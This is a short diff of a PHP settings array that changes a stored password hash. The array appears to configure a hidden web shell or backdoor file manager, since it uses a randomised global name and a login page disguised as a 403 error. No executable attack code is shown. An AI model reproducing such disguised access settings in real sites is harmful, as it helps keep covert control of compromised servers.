@@ -5,7 +5,7 @@
 */
 $GLOBALS['oZgNypoPRU'] = array(
     'username' => 'Bohuatloh',
-    'password' => 'a62d3df3228bc8ec351e660454f9f320',
+    'password' => '2e92787633f67218d58820047fc12b88',
     'safe_mode' => '1',
     'login_page' => '403',
     'show_icons' => '1',
